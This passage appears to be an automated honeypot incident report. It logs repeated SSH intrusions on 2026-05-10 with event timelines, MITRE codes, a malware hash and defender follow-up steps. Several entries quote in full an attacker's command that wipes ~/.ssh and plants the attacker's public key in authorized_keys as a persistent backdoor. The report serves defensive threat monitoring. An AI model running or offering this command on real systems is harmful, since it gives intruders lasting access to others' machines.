| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:50:17` | `cowrie.session.connect` |
| `2026-05-10 11:50:17` | `cowrie.client.version` |
| `2026-05-10 11:50:17` | `cowrie.client.kex` |
| `2026-05-10 11:50:18` | `cowrie.login.success` |
| `2026-05-10 11:50:19` | `cowrie.session.params` |
| `2026-05-10 11:50:19` | `cowrie.command.input` |
| `2026-05-10 11:50:19` | `cowrie.command.failed` |
| `2026-05-10 11:50:19` | `cowrie.log.closed` |
| `2026-05-10 11:50:20` | `cowrie.session.params` |
| `2026-05-10 11:50:20` | `cowrie.command.input` |
| `2026-05-10 11:50:20` | `cowrie.session.file_download` |
| `2026-05-10 11:50:20` | `cowrie.log.closed` |
| `2026-05-10 11:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d17dae7df9

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:50 |
| **Last Seen** | 2026-05-10 11:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:50:23` | `cowrie.session.connect` |
| `2026-05-10 11:50:23` | `cowrie.client.version` |
| `2026-05-10 11:50:24` | `cowrie.client.kex` |
| `2026-05-10 11:50:25` | `cowrie.login.success` |
| `2026-05-10 11:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eae63e7a20de

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:51 |
| **Last Seen** | 2026-05-10 11:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:51:07` | `cowrie.session.connect` |
| `2026-05-10 11:51:07` | `cowrie.client.version` |
| `2026-05-10 11:51:07` | `cowrie.client.kex` |
| `2026-05-10 11:51:08` | `cowrie.login.success` |
| `2026-05-10 11:51:09` | `cowrie.session.params` |
| `2026-05-10 11:51:09` | `cowrie.command.input` |
| `2026-05-10 11:51:09` | `cowrie.command.failed` |
| `2026-05-10 11:51:09` | `cowrie.log.closed` |
| `2026-05-10 11:51:10` | `cowrie.session.params` |
| `2026-05-10 11:51:10` | `cowrie.command.input` |
| `2026-05-10 11:51:10` | `cowrie.session.file_download` |
| `2026-05-10 11:51:10` | `cowrie.log.closed` |
| `2026-05-10 11:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa02ec2551d

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:51 |
| **Last Seen** | 2026-05-10 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:51:14` | `cowrie.session.connect` |
| `2026-05-10 11:51:14` | `cowrie.client.version` |
| `2026-05-10 11:51:14` | `cowrie.client.kex` |
| `2026-05-10 11:51:15` | `cowrie.login.success` |
| `2026-05-10 11:51:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bdf808b5e42

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:51 |
| **Last Seen** | 2026-05-10 11:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:51:56` | `cowrie.session.connect` |
| `2026-05-10 11:51:56` | `cowrie.client.version` |
| `2026-05-10 11:51:56` | `cowrie.client.kex` |
| `2026-05-10 11:51:58` | `cowrie.login.success` |
| `2026-05-10 11:51:58` | `cowrie.session.params` |
| `2026-05-10 11:51:58` | `cowrie.command.input` |
| `2026-05-10 11:51:58` | `cowrie.command.failed` |
| `2026-05-10 11:51:58` | `cowrie.log.closed` |
| `2026-05-10 11:51:59` | `cowrie.session.params` |
| `2026-05-10 11:51:59` | `cowrie.command.input` |
| `2026-05-10 11:51:59` | `cowrie.session.file_download` |
| `2026-05-10 11:51:59` | `cowrie.log.closed` |
| `2026-05-10 11:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9934b40dca4e

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:52 |
| **Last Seen** | 2026-05-10 11:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:52:03` | `cowrie.session.connect` |
| `2026-05-10 11:52:03` | `cowrie.client.version` |
| `2026-05-10 11:52:03` | `cowrie.client.kex` |
| `2026-05-10 11:52:04` | `cowrie.login.success` |
| `2026-05-10 11:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95067393c154

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:53 |
| **Last Seen** | 2026-05-10 11:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:53:37` | `cowrie.session.connect` |
| `2026-05-10 11:53:37` | `cowrie.client.version` |
| `2026-05-10 11:53:37` | `cowrie.client.kex` |
| `2026-05-10 11:53:38` | `cowrie.login.success` |
| `2026-05-10 11:53:39` | `cowrie.session.params` |
| `2026-05-10 11:53:39` | `cowrie.command.input` |
| `2026-05-10 11:53:39` | `cowrie.command.failed` |
| `2026-05-10 11:53:39` | `cowrie.log.closed` |
| `2026-05-10 11:53:39` | `cowrie.session.params` |
| `2026-05-10 11:53:39` | `cowrie.command.input` |
| `2026-05-10 11:53:40` | `cowrie.session.file_download` |
| `2026-05-10 11:53:40` | `cowrie.log.closed` |
| `2026-05-10 11:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7762947669a6

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:53 |
| **Last Seen** | 2026-05-10 11:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:53:43` | `cowrie.session.connect` |
| `2026-05-10 11:53:43` | `cowrie.client.version` |
| `2026-05-10 11:53:43` | `cowrie.client.kex` |
| `2026-05-10 11:53:45` | `cowrie.login.success` |
| `2026-05-10 11:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a41f8479a3e

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:54 |
| **Last Seen** | 2026-05-10 11:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:54:28` | `cowrie.session.connect` |
| `2026-05-10 11:54:28` | `cowrie.client.version` |
| `2026-05-10 11:54:29` | `cowrie.client.kex` |
| `2026-05-10 11:54:30` | `cowrie.login.success` |
| `2026-05-10 11:54:31` | `cowrie.session.params` |
| `2026-05-10 11:54:31` | `cowrie.command.input` |
| `2026-05-10 11:54:31` | `cowrie.command.failed` |
| `2026-05-10 11:54:31` | `cowrie.log.closed` |
| `2026-05-10 11:54:32` | `cowrie.session.params` |
| `2026-05-10 11:54:32` | `cowrie.command.input` |
| `2026-05-10 11:54:32` | `cowrie.session.file_download` |
| `2026-05-10 11:54:32` | `cowrie.log.closed` |
| `2026-05-10 11:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da3e9f9668e9

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:54 |
| **Last Seen** | 2026-05-10 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:54:35` | `cowrie.session.connect` |
| `2026-05-10 11:54:35` | `cowrie.client.version` |
| `2026-05-10 11:54:36` | `cowrie.client.kex` |
| `2026-05-10 11:54:37` | `cowrie.login.success` |
| `2026-05-10 11:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ac455914c7

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:55 |
| **Last Seen** | 2026-05-10 11:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:55:21` | `cowrie.session.connect` |
| `2026-05-10 11:55:21` | `cowrie.client.version` |
| `2026-05-10 11:55:22` | `cowrie.client.kex` |
| `2026-05-10 11:55:23` | `cowrie.login.success` |
| `2026-05-10 11:55:23` | `cowrie.session.params` |
| `2026-05-10 11:55:23` | `cowrie.command.input` |
| `2026-05-10 11:55:23` | `cowrie.command.failed` |
| `2026-05-10 11:55:24` | `cowrie.log.closed` |
| `2026-05-10 11:55:24` | `cowrie.session.params` |
| `2026-05-10 11:55:24` | `cowrie.command.input` |
| `2026-05-10 11:55:25` | `cowrie.session.file_download` |
| `2026-05-10 11:55:25` | `cowrie.log.closed` |
| `2026-05-10 11:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4e2f7550663

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:55 |
| **Last Seen** | 2026-05-10 11:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:55:28` | `cowrie.session.connect` |
| `2026-05-10 11:55:28` | `cowrie.client.version` |
| `2026-05-10 11:55:28` | `cowrie.client.kex` |
| `2026-05-10 11:55:29` | `cowrie.login.success` |
| `2026-05-10 11:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2754601a365

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:57 |
| **Last Seen** | 2026-05-10 11:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:57:04` | `cowrie.session.connect` |
| `2026-05-10 11:57:04` | `cowrie.client.version` |
| `2026-05-10 11:57:04` | `cowrie.client.kex` |
| `2026-05-10 11:57:06` | `cowrie.login.success` |
| `2026-05-10 11:57:06` | `cowrie.session.params` |
| `2026-05-10 11:57:06` | `cowrie.command.input` |
| `2026-05-10 11:57:06` | `cowrie.command.failed` |
| `2026-05-10 11:57:07` | `cowrie.log.closed` |
| `2026-05-10 11:57:07` | `cowrie.session.params` |
| `2026-05-10 11:57:07` | `cowrie.command.input` |
| `2026-05-10 11:57:08` | `cowrie.session.file_download` |
| `2026-05-10 11:57:08` | `cowrie.log.closed` |
| `2026-05-10 11:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae7c8f15cb2

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:57 |
| **Last Seen** | 2026-05-10 11:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:57:11` | `cowrie.session.connect` |
| `2026-05-10 11:57:11` | `cowrie.client.version` |
| `2026-05-10 11:57:11` | `cowrie.client.kex` |
| `2026-05-10 11:57:12` | `cowrie.login.success` |
| `2026-05-10 11:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b72d1ff59ee

| Field | Detail |
|---|---|
| **Source IP** | `193.24.211[.]100` |
| **First Seen** | 2026-05-10 12:43 |
| **Last Seen** | 2026-05-10 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 12:43:25` | `cowrie.session.connect` |
| `2026-05-10 12:43:25` | `cowrie.client.version` |
| `2026-05-10 12:43:25` | `cowrie.client.kex` |
| `2026-05-10 12:43:26` | `cowrie.login.success` |
| `2026-05-10 12:43:26` | `cowrie.direct-tcpip.request` |
| `2026-05-10 12:43:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-10 12:43:26` | `cowrie.direct-tcpip.data` |
| `2026-05-10 12:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.24.211[.]100` to AbuseIPDB if not already reported
- [ ] Block `193.24.211[.]100` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79618e35c2d

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-05-10 13:14 |
| **Last Seen** | 2026-05-10 13:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:14:46` | `cowrie.session.connect` |
| `2026-05-10 13:14:46` | `cowrie.client.version` |
| `2026-05-10 13:14:46` | `cowrie.client.kex` |
| `2026-05-10 13:14:47` | `cowrie.login.success` |
| `2026-05-10 13:14:48` | `cowrie.session.params` |
| `2026-05-10 13:14:48` | `cowrie.command.input` |
| `2026-05-10 13:14:48` | `cowrie.command.failed` |
| `2026-05-10 13:14:48` | `cowrie.log.closed` |
| `2026-05-10 13:14:50` | `cowrie.session.params` |
| `2026-05-10 13:14:50` | `cowrie.command.input` |
| `2026-05-10 13:14:50` | `cowrie.session.file_download` |
| `2026-05-10 13:14:50` | `cowrie.log.closed` |
| `2026-05-10 13:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db22538e0c5a

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-05-10 13:14 |
| **Last Seen** | 2026-05-10 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 13:14:53` | `cowrie.session.connect` |
| `2026-05-10 13:14:53` | `cowrie.client.version` |
| `2026-05-10 13:14:53` | `cowrie.client.kex` |
| `2026-05-10 13:14:54` | `cowrie.login.success` |
| `2026-05-10 13:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0802e30668af

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-05-10 13:16 |
| **Last Seen** | 2026-05-10 13:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
